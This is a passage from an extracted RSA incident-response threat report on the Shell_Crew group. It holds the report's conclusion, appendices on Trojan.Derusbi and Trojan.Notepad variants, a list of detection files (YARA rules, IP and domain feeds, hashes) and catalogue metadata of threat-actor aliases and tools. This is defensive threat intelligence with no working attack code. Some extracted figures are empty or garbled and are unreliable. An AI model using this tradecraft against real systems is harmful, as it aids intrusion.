UTC4/11/2013 11:32:19 AM UTC4/11/2013 11:33:48 AM UTC4/11/2013 11:34:36 AM UTC4/11/2013 11:38:15 AM UTC\n\n10\n\n\n8\n\n6\n\n\n4\n\n2\n\n\n0\n\n|MMMMMMMMMM|Col2|Col3|Col4|Col5|Col6|Col7|Col8|Col9|Col10|Col11|Col12|\n|---|---|---|---|---|---|---|---|---|---|---|---|\n|||||||||||||\n|||||||||||||\n|||||||||||||\n|||||||||||||\n|||||||||||||\n|||||||||||||\n|||||||||||||\n\n\n**Submission Time**\n\n\n**Figure 48: Malware sample testing**\n\n\n##### 5. Hash Set, IPs, Domains\n\nAll hashes, IP Addresses, and domains discussed within this report as associated with Shell_Crew can be found in the\nattached Digital Appendix.\n\n\nRSA Emerging Threat Profile: Shell_Crew\n\n\n-----\n\nRSA Incident Response Page 36\n\n### Conclusion\n\nThis report detailed techniques and tools that are frequently used by an advanced adversary being referred to by the RSA IR\nTeam as Shell_Crew. The information delivered in this report was provided so organizations can turn the data into\nactionable intelligence, for detection or prevention of this advanced threat. As of the date of this report, Shell_Crew\ncontinues to be a formidable threat group that is actively attacking organizations. In instances where Shell_Crew has\nalready breached an organization, the RSA IR Team has observed that the adversary will aggressively attempt to regain a\nfoothold once their Trojans have been eradicated and communication channels severed. If any of their existing backdoors\nor Web shells remain active in the environment, Shell_Crew will begin to redeploy other tiers of malware that communicate\nthrough different channels, which may use different protocols and obfuscation techniques.\n\nThe RSA IR Team has observed instances where Shell_Crew has persisted in enterprises for years before they are detected.\nDuring that time, Shell_Crew updated or replaced existing malicious backdoors, continued to map the enterprise while\ninstalling Web shells or poisoning existing web pages, and performed internal reconnaissance of victims to determine what\nAV and security products are being deployed in these environments. These tenacious approaches make it difficult for an\nunder resourced internal security team to detect, and furthermore, eradicate this adversary.\n\nThe RSA IR Team will continue to track the TTPs used by this group and distribute information about this and other\nadversaries. The information that is provided in the digital appendix and throughout the report can be ingested directly into\nRSA products or used agnostically with other products.\n\nIf you have any questions about this emerging threat profile or the RSA Incident Response Team, please send an email to\n[FirstResponse@rsa.com or contact your RSA Account Representative.](mailto:FirstResponse@rsa.com)\n\n\nRSA Emerging Threat Profile: Shell_Crew\n\n\n-----\n\nRSA Incident Response Page 37\n\n### Appendix 1 – Trojan.Derusbi Variants\n\nThe below images illustrate the different relationships between the Trojan.Derusbi samples that were listed in the\nMalicious Files Section. The XOR keys in blue, were used to decode the Configuration data that is used by the sample. The\nXOR keys in red were used to decode the embedded driver files.\n\n**Figure 49: Trojan.Derusbi Variants Mutex Overlap**\n\n\n-----\n\nRSA Incident Response Page 38\n\n**Figure 50: Trojan.Derusbi variants XOR key overlap**\n\n\n-----\n\nRSA Incident Response Page 39\n\n**Figure 51: Trojan.Derusbi variants XOR key overlap**\n\n\n-----\n\nRSA Incident Response Page 40\n\n**Figure 52: Trojan.Derusbi variants XOR key overlap**\n\n\n-----\n\nRSA Incident Response Page 41\n\n### Appendix 2 – Trojan.Notepad Illustration\n\nThe illustration below shows relationships between the Trojan.Notepad samples that were listed in the Malicious\nFiles/Tools Section. These samples are grouped by file description.\n\n**Figure 53: Relationships between Trojan.Notepad samples**\n\n\n-----\n\nRSA Incident Response Page 42\n\n### Digital Appendix - Details\n\nBelow is a list of the files and folders contained within the ShellCrew_Digital_Appendix. All content should be tested before\nfull integration into SA, ECAT, or 3[rd] party tools to prevent any adverse effects from unknown environmental variables.\n\nShellCrew_Digital_Appendix.zip File Hash: 4e324ffae9ce8688bdb2f569274dff7c\n\nShellCrew_Digital_Appendix.zip Contents:\n\n  - **ECAT_Blacklist (Folder containing ECAT Hash Import)**\n\n`o` **Derusbi_Notepad.xml**\n\n  - **feeds folder (Folder containing SA feeds, Shell_Crew Domains and IPs)**\n\n`o` **Derusbi_Domain.feed**\n`o` **Derusbi_Domain.csv (List of Shell_Crew Domains)**\n`o` **derusbi_domain.xml**\n`o` **Derusbi_IP.feed**\n`o` **Derusbi_IP.txt (List of Shell_Crew IPs)**\n`o` **derusbi_ip.xml**\n\n  - **parsers folder (Folder containing SA parsers)**\n\n`o` **derusbi_server.lua (Parser for Derusbi Handshake)**\n`o` **derusbi_variant.parser (Parser for Derusbi variant beaconing)**\n\n  - **ShellCrewHashset.md5 file (List of Shell_Crew File/Tool Hashes)**\n\n  - **yara folder (Folder containing Yara sigs)**\n\n`o` **Shell_Crew.yara**\n\nFor any questions or issues deploying the Security Analytics or ECAT content into your environment, please contact RSA\nSupport.\n\n\nRSA Emerging Threat Profile: Shell_Crew\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/xqldk5renv5ecihr7wyyazplrnezknmx",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2014/2014.01.21.Shell_Crew/h12756-wp-shell-crew.pdf",
        "https://paper.seebug.org/papers/APT/APT_CyberCriminal_Campagin/2014/h12756-wp-shell-crew.pdf"
    ],
    "report_names": [
        "h12756-wp-shell-crew",
        "h12756-wp-shell-crew.pdf"
    ],
    "threat_actors": [
        {
            "id": "7a9a7873-8e41-40ae-9d06-b27c92bb54e4",
            "created_at": "2022-10-25T16:47:55.568362Z",
            "updated_at": "2025-03-27T02:05:17.264615Z",
            "deleted_at": null,
            "main_name": "BRONZE FIRESTONE",
            "aliases": [
                "C0d0s0",
                "Deep Panda ",
                "Pupa ",
                "TG-3551 ",
                "APT19 "
            ],
            "source_name": "Secureworks:BRONZE FIRESTONE",
            "tools": [
                " Alice's Rabbit Hole",
                " Briba",
                " Cobalt Strike",
                " Derusbi",
                " PlugX",
                " PoisonIvy",
                " Powershell Empire",
                " Zuguo",
                "9002"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "3fad11c6-4336-4b28-a606-f510eca5452e",
            "created_at": "2022-10-25T16:07:24.346573Z",
            "updated_at": "2025-03-27T02:02:10.183211Z",
            "deleted_at": null,
            "main_name": "Turbine Panda",
            "aliases": [
                "APT 26",
                "Black Vine",
                "Bronze Express",
                "Group 13",
                "JerseyMikes",
                "KungFu Kittens",
                "PinkPanther",
                "Shell Crew",
                "Turbine Panda",
                "WebMasters"
            ],
            "source_name": "ETDA:Turbine Panda",
            "tools": [
                "Agent.dhwf",
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Derusbi",
                "Destroy RAT",
                "DestroyRAT",
                "FF-RAT",
                "FormerFirstRAT",
                "Hurix",
                "Kaba",
                "Korplug",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mivast",
                "PlugX",
                "RbDoor",
                "RedDelta",
                "RibDoor",
                "Sakula",
                "Sakula RAT",
                "Sakurel",
                "Sogu",
                "StreamEx",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Winnti",
                "Xamtrav",
                "cobeacon",
                "ffrat"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "2f07a03f-eb1f-47c8-a8e9-a1a00f2ec253",
            "created_at": "2022-10-25T16:07:24.277669Z",
            "updated_at": "2025-03-27T02:02:10.157972Z",
            "deleted_at": null,
            "main_name": "TA428",
            "aliases": [
                "Operation LagTime IT",
                "Operation StealthyTrident",
                "ThunderCats"
            ],
            "source_name": "ETDA:TA428",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Agent.dhwf",
                "Albaniiutas",
                "BlueTraveller",
                "Chymine",
                "Cotx RAT",
                "CoughingDown",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "Gen:Trojan.Heur.PT",
                "Kaba",
                "Korplug",
                "LuckyBack",
                "PhantomNet",
                "PlugX",
                "Poison Ivy",
                "RedDelta",
                "RoyalRoad",
                "SManager",
                "SPIVY",
                "Sogu",
                "TIGERPLUG",
                "TManger",
                "TVT",
                "Thoper",
                "Xamtrav",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "64ca1755-3883-4173-8e0a-6e5cf92faafd",
            "created_at": "2022-10-25T15:50:23.636456Z",
            "updated_at": "2025-03-27T02:00:55.51077Z",
            "deleted_at": null,
            "main_name": "Deep Panda",
            "aliases": [
                "Deep Panda",
                "Shell Crew",
                "KungFu Kittens",
                "PinkPanther",
                "Black Vine"
            ],
            "source_name": "MITRE:Deep Panda",
            "tools": [
                "Mivast",
                "StreamEx",
                "Sakula",
                "Tasklist",
                "Derusbi"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "46a151bd-e4c2-46f9-aee9-ee6942b01098",
            "created_at": "2023-01-06T13:46:38.288168Z",
            "updated_at": "2025-03-27T02:00:02.794118Z",
            "deleted_at": null,
            "main_name": "APT19",
            "aliases": [
                "Black Vine",
                "TEMP.Avengers",
                "PinkPanther",
                "G0073",
                "KungFu Kittens",
                "Group 13",
                "Shell Crew",
                "BRONZE FIRESTONE",
                "G0009",
                "Sunshop Group",
                "DEEP PANDA",
                "Codoso"
            ],
            "source_name": "MISPGALAXY:APT19",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "1edcac0b-efd9-47b1-9aca-33827d5bd085",
            "created_at": "2024-05-01T02:03:07.964773Z",
            "updated_at": "2025-03-27T02:05:17.273595Z",
            "deleted_at": null,
            "main_name": "BRONZE KEYSTONE",
            "aliases": [
                "Aurora Panda ",
                "DeputyDog ",
                "Group 72 ",
                "Hidden Lynx ",
                "Shell Crew",
                "TG-8153 ",
                "Tailgater Team",
                "APT17 "
            ],
            "source_name": "Secureworks:BRONZE KEYSTONE",
            "tools": [
                " BlackCoffee",
                " DeputyDog",
                " Derusbi",
                " Gh0stHTTPSDropper",
                " HiKit",
                " InternalCMD",
                " PlugX",
                " PoisonIvy",
                " ZxShell",
                "9002"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "0639667a-fb3f-43d9-a38c-6c123fd19c7f",
            "created_at": "2022-10-25T16:07:23.335869Z",
            "updated_at": "2025-03-27T02:02:09.743237Z",
            "deleted_at": null,
            "main_name": "APT 19",
            "aliases": [
                "APT 19",
                "Bronze Firestone",
                "C0d0so0",
                "Codoso",
                "Deep Panda",
                "Operation Kingslayer",
                "Red Pegasus",
                "Sunshop Group",
                "TG-3551"
            ],
            "source_name": "ETDA:APT 19",
            "tools": [
                "Agentemis",
                "C0d0so0",
                "Cobalt Strike",
                "CobaltStrike",
                "Derusbi",
                "EmPyre",
                "EmpireProject",
                "Fire Chili",
                "PowerShell Empire",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716504,
    "ts_updated_at": 1743041802,
    "ts_creation_date": 1390861622,
    "ts_modification_date": 1390912492,
    "files": {
        "pdf": "https://archive.orkl.eu/ec6771a81e830f50c2d54b26dc0f6a642439ee09.pdf",
        "text": "https://archive.orkl.eu/ec6771a81e830f50c2d54b26dc0f6a642439ee09.txt",
        "img": "https://archive.orkl.eu/ec6771a81e830f50c2d54b26dc0f6a642439ee09.jpg"
    }
}